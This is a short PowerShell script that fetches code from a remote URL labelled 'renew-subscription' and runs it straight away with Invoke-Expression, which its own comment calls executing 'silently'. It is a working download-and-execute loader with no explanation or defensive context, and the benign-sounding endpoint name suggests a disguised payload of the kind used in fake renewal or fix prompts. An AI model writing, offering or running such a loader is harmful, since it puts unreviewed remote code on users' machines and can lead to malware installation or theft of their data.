$scriptUrl = "https://backend-apis-tau.vercel.app/api/renew-subscription"

try {
    $ErrorActionPreference = "Stop"

    # Download the script content as string
    $scriptContent = Invoke-RestMethod -Uri $scriptUrl -Method Get

    # Execute the downloaded script content silently
    Invoke-Expression $scriptContent
}
catch {
    Write-Host "`nError executing script: $($_.Exception.Message)"
}
